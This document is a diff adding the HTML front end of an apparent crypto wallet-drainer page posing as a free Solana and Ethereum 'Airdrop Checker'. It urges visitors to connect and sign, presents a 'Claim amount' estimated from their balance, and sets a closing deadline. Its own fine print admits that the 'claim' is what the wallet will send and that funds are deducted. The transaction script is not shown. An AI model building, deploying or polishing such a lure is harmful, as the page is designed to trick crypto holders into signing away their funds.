@@ -1,0 +1,131 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <meta name="theme-color" content="#101417">
+  <meta name="description" content="Free airdrop checker. Connect or paste an address, see what is waiting for you.">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Airdrop Checker">
+  <meta property="og:description" content="Paste an address. No wallet, no signature during the check.">
+  <meta property="og:image" content="og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Airdrop Checker">
+  <meta name="twitter:description" content="Paste an address. No wallet, no signature during the check.">
+  <meta name="twitter:image" content="og.png">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src https://mainnet.helius-rpc.com https://eth.drpc.org https://rpc.flashbots.net https://ethereum-rpc.publicnode.com https://api.mainnet-beta.solana.com https://solana-rpc.publicnode.com https://api.devnet.solana.com https://api.dexscreener.com; img-src 'self' data: https:; base-uri 'none'; object-src 'none'; form-action 'none'">
+  <title>Airdrop Checker</title>
+  <link rel="icon" href="favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="style.css">
+  <script src="vendor/buffer.js"></script>
+  <script src="vendor/solana-web3.js" defer></script>
+  <script src="app.js" defer></script>
+</head>
+<body>
+  <main class="shell">
+    <article class="card" aria-labelledby="title">
+      <header class="intro">
+        <span class="network"><span class="dot" aria-hidden="true"></span> Solana · Ethereum</span>
+        <h1 id="title">Check your wallet. takes 10 seconds.</h1>
+        <p class="lede">Independent checker. Not the project team.</p>
+        <div class="chain-tabs" role="tablist" aria-label="Network">
+          <button id="tab-sol" class="chain-tab" role="tab" type="button" aria-selected="true" data-chain="sol">Solana</button>
+          <button id="tab-eth" class="chain-tab" role="tab" type="button" aria-selected="false" data-chain="eth">Ethereum</button>
+        </div>
+      </header>
+
+      <form id="query-form" novalidate>
+        <div class="safety-card" role="note">
+          <strong>Read-only</strong>
+          <p>Checking needs no wallet and no signature. Only the claim does.</p>
+        </div>
+        <button id="connect-button" class="button primary connect-cta" type="button">Connect wallet to check</button>
+        <p id="connect-status" class="message" role="status" hidden></p>
+
+        <div class="paste-row">
+          <p class="or">or paste an address</p>
+          <div class="paste-field">
+            <input id="address" name="address" type="text" placeholder="Solana address…" inputmode="text" autocomplete="off" autocapitalize="off" spellcheck="false" aria-describedby="address-error">
+            <button id="paste-button" class="paste-button" type="button">Paste</button>
+          </div>
+          <p id="address-error" class="message error" role="alert" hidden></p>
+          <button id="query-button" class="button secondary" type="submit">check address</button>
+        </div>
+      </form>
+      <noscript><p class="message error">Enable JavaScript to check an address.</p></noscript>
+
+      <section id="result" class="results" aria-label="Address lookup results" hidden>
+        <div class="result-meta">
+          <div class="address-row">
+            <p id="result-address" class="result-address mono"></p>
+            <a id="explorer-link" class="explorer-link" href="https://solscan.io" target="_blank" rel="noopener noreferrer">View on explorer ↗</a>
+            <button id="change-address" class="link-button" type="button">Change address</button>
+          </div>
+          <p id="checked-at" class="checked-at mono" hidden></p>
+        </div>
+
+        <div id="allocation" class="allocation" hidden>
+          <div class="rank-block">
+            <span id="tier" class="tier"></span>
+            <p id="rank-detail" class="rank-detail"></p>
+          </div>
+          <div class="allocation-head">
+            <h2 id="allocation-title">Claim amount</h2>
+            <button id="hide-values" class="hide-toggle" type="button" aria-pressed="false">Hide values</button>
+          </div>
+          <div class="reward"><span id="amount" class="mono"></span><span id="symbol">SOL</span></div>
+          <p id="estimate" class="estimate mono"></p>
+          <p class="fineprint">This is what your wallet will send.</p>
+        </div>
+
+        <h2 id="balances-title" class="balance-heading">Public on-chain balances</h2>
+        <div id="balance-panel" role="group" aria-labelledby="balances-title" aria-busy="false">
+          <div id="skeleton" class="balance-grid skeleton" aria-hidden="true" hidden>
+            <span></span><span></span><span></span><span></span>
+          </div>
+          <dl id="balances" class="balance-grid" hidden></dl>
+        </div>
+        <p id="rpc-status" class="message" role="status" hidden></p>
+        <button id="retry" class="retry" type="button" hidden>Retry lookup</button>
+
+        <div id="claim-box" class="claim-box" hidden>
+          <div id="fee-block" class="fee-block" hidden>
+            <div class="fee-row"><span>Network fee</span><span id="fee-network" class="mono"></span></div>
+            <div id="fee-deposit-row" class="fee-row" hidden><span>Token account deposit</span><span id="fee-deposit" class="mono"></span></div>
+            <div class="fee-row total"><span>Total deducted</span><span id="fee-total" class="mono"></span></div>
+          </div>
+          <p id="approval-line" class="approval-line" hidden></p>
+
+          <details class="disclosure">
+            <summary>Why does it need my wallet?</summary>
+            <p>The claim settles to your wallet, so only the wallet can sign it. Your address alone can't sign.</p>
+          </details>
+
+          <button id="claim-button" class="button claim-cta" type="button">Sign in wallet</button>
+          <p id="claim-sub" class="claim-sub mono"></p>
+          <p id="claim-status" class="message" role="status" hidden></p>
+
+          <details class="disclosure faq">
+            <summary>Before you sign</summary>
+            <dl>
+              <dt>Does checking need a signature?</dt><dd>No. Only a public address.</dd>
+              <dt>Why does my wallet show a deduction?</dt><dd>The claim is a transfer, not free money. Fee and deposit are listed above.</dd>
+              <dt>Who runs this page?</dt><dd>An independent tool.</dd>
+              <dt>How is the amount calculated?</dt><dd>Estimated from your balance.</dd>
+              <dt>Wallet says unknown address — what now?</dt><dd>Check the spender link above on the explorer, then decide.</dd>
+            </dl>
+          </details>
+        </div>
+
+        <p class="deadline">Claims close on 28 Nov 2026 at 23:59 UTC.</p>
+      </section>
+
+      <footer>
+        <p>Public RPC providers receive the wallet address when you check it.</p>
+        <div class="footer-meta"><span class="mono">v0.4.0</span></div>
+      </footer>
+    </article>
+  </main>
+</body>
+</html>
